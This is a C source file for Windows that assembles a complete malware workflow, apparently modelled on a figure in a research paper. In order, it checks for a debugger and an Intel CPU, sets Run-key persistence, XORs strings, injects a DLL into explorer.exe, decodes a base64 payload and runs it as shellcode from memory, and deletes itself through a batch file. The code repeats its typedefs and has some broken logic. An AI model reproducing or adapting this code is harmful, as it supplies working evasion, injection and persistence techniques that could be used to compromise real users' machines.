
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>


#include <windows.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

BOOL Debugger_Identification() {
    BOOL isDebuggerPresent = FALSE;
    BOOL remoteDebuggerPresent = FALSE;
    HANDLE hProcess = GetCurrentProcess();

    // 1. IsDebuggerPresent()
    if (IsDebuggerPresent()) {
        isDebuggerPresent = TRUE;
    }

    // 2. CheckRemoteDebuggerPresent()
    CheckRemoteDebuggerPresent(hProcess, &remoteDebuggerPresent);

    return isDebuggerPresent || remoteDebuggerPresent;
}

#include <windows.h>
#include <stdio.h>

// Define UNICODE_STRING if not available (MinGW)
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
  WORD  wReserved1;
  WORD  wReserved2;
  DWORD dwReserved3;
  DWORD dwReserved4;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

BOOL CPU_Identification() {
  INT CPUInfo[4] = {0};
  __cpuid(CPUInfo, 0);

  if (CPUInfo[0] >= 1) {
    __cpuid(CPUInfo, 1);
  } else {
    return FALSE;
  }

  char Vendor[13] = {0};
  __cpuid(CPUInfo, 0);
  memcpy(Vendor + 0, &CPUInfo[1], 4);
  memcpy(Vendor + 4, &CPUInfo[3], 4);
  memcpy(Vendor + 8, &CPUInfo[2], 4);

  if (strcmp(Vendor, "GenuineIntel") == 0) {
    return TRUE;
  } else {
    return FALSE;
  }
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void AutoRun() {
    HKEY hKey;
    LONG lResult;
    wchar_t szPath[MAX_PATH];
    DWORD dwSize = sizeof(szPath);

    if (GetModuleFileNameW(NULL, szPath, MAX_PATH) == 0) {
        return; // GetModuleFileName failed
    }

    lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (lResult == ERROR_SUCCESS) {
        lResult = RegSetValueExW(hKey, L"MyApplication", 0, REG_SZ, (const BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));

        if (lResult != ERROR_SUCCESS) {
            // Handle error if setting the value fails
        }

        RegCloseKey(hKey);
    } else {
        // Handle error if opening the key fails
    }
}

#include <windows.h>

void String_XOR(char *string, char *key) {
    int string_len = strlen(string);
    int key_len = strlen(key);

    for (int i = 0; i < string_len; i++) {
        string[i] = string[i] ^ key[i % key_len];
    }
}

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void DLL_Injection(char *dll, char *process) {
    DWORD processID = 0;
    HANDLE hProcess = NULL;
    LPVOID LoadLibAddr = NULL;
    LPVOID RemoteStringAddr = NULL;
    HANDLE hThread = NULL;

    // Get process ID by process name
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (strcmp(entry.szExeFile, process) == 0) {
                processID = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (processID == 0) {
        fprintf(stderr, "Process not found!\n");
        return;
    }

    // Open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        fprintf(stderr, "OpenProcess failed: %d\n", GetLastError());
        return;
    }

    // Get the address of LoadLibraryA
    LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (LoadLibAddr == NULL) {
        fprintf(stderr, "GetProcAddress(LoadLibraryA) failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Allocate memory in the remote process for the DLL path
    RemoteStringAddr = VirtualAllocEx(hProcess, NULL, strlen(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (RemoteStringAddr == NULL) {
        fprintf(stderr, "VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, RemoteStringAddr, dll, strlen(dll) + 1, NULL)) {
        fprintf(stderr, "WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread to call LoadLibraryA with the DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibAddr, RemoteStringAddr, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

#include <windows.h>
#include <stdio.h>

int Load_From_File(void *file_name, void *buffer) {
  HANDLE hFile;
  DWORD fileSize;
  DWORD bytesRead;

  hFile = CreateFile((LPCTSTR)file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (hFile == INVALID_HANDLE_VALUE) {
    return 0; // Error opening file
  }

  fileSize = GetFileSize(hFile, NULL);

  if (fileSize == INVALID_FILE_SIZE) {
    CloseHandle(hFile);
    return 0; // Error getting file size
  }

  if (buffer == NULL) {
      CloseHandle(hFile);
      return fileSize;
  }
  
  if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
    CloseHandle(hFile);
    return 0; // Error reading file
  }

  CloseHandle(hFile);

  if (bytesRead != fileSize) {
      return 0;
  }

  return (int)fileSize;
}

#include <windows.h>
#include <wincrypt.h> // Required for CryptStringToBinary

int Decode_Base64(void *encoded, int size, void *decoded) {
    if (encoded == NULL || decoded == NULL || size < 0) {
        // Invalid input parameters
        return 0;
    }

    DWORD decoded_size = 0;

    // First call to CryptStringToBinaryA to determine the required output buffer size.
    // The 'size' parameter is passed as cchString, so the input buffer
    // 'encoded' does not need to be null-terminated.
    if (!CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the encoded string buffer
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag to specify Base64 decoding
        NULL,                   // Output buffer is NULL to get the required size
        &decoded_size,          // Receives the required size of the output buffer
        NULL,                   // Not used for this operation
        NULL                    // Not used for this operation
    )) {
        // An error occurred (e.g., invalid Base64 string)
        return 0;
    }

    if (decoded_size == 0 && size == 0) {
        // Special case: an empty input string correctly decodes to an empty output.
        // In this specific scenario, decoded_size will be 0, and this is a valid result.
        return 0;
    }
    
    // Second call to CryptStringToBinaryA to perform the actual decoding
    if (!CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the encoded string buffer
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag to specify Base64 decoding
        (BYTE *)decoded,        // Pointer to the caller-provided output buffer
        &decoded_size,          // Receives the actual size of the decoded data
        NULL,                   // Not used for this operation
        NULL                    // Not used for this operation
    )) {
        // An error occurred during decoding (e.g., buffer too small, or other error)
        // Note: This function assumes the 'decoded' buffer is large enough.
        // The caller is responsible for allocating 'decoded' with at least the size
        // obtained from the first call to CryptStringToBinaryA.
        return 0;
    }

    return (int)decoded_size;
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void Run_From_Memory(void *shellcode, int size) {
    DWORD oldProtect;
    void (*func)();

    VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &oldProtect);

    func = (void (*)())shellcode;
    func();

    VirtualProtect(shellcode, size, oldProtect, &oldProtect);
}

#include <windows.h>

#ifndef UNICODE
typedef struct _STRING {
  USHORT Length;
  USHORT MaximumLength;
  PCHAR  Buffer;
} STRING, *PSTRING;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#endif

void Delete_File(char *filename) {
  DeleteFileA(filename);
}

#include <windows.h>

#ifndef UNICODE
typedef unsigned short WCHAR;
#define UNICODE
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void Delete_Itself() {
    WCHAR filename[MAX_PATH + 1];
    DWORD length = GetModuleFileNameW(NULL, filename, MAX_PATH);
    if (length == 0 || length > MAX_PATH) {
        return; // Failed to get the filename
    }

    // Create a batch file to delete the executable
    WCHAR batchFilename[MAX_PATH + 1];
    WCHAR tempPath[MAX_PATH + 1];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        return;
    }

    if (GetTempFileNameW(tempPath, L"del", 0, batchFilename) == 0) {
        return;
    }

    HANDLE hFile = CreateFileW(batchFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    WCHAR batchContent[MAX_PATH * 2 + 100];
    swprintf_s(batchContent, sizeof(batchContent) / sizeof(WCHAR),
               L"@echo off\r\n"
               L":repeat\r\n"
               L"del \"%s\"\r\n"
               L"if exist \"%s\" (\r\n"
               L"   timeout /t 1 /nobreak > nul\r\n"
               L"   goto repeat\r\n"
               L")\r\n"
               L"del \"%%~f0\"\r\n"
               L"exit",
               filename, filename);
    DWORD bytesWritten;
    WriteFile(hFile, batchContent, (DWORD)(wcslen(batchContent) * sizeof(WCHAR)), &bytesWritten, NULL);
    CloseHandle(hFile);

    // Execute the batch file in a separate process
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    WCHAR cmdLine[MAX_PATH + 10];
    swprintf_s(cmdLine, sizeof(cmdLine) / sizeof(WCHAR), L"cmd.exe /c start \"\" /min %s", batchFilename);

    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    ExitProcess(0); // Terminate the current process
}


#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
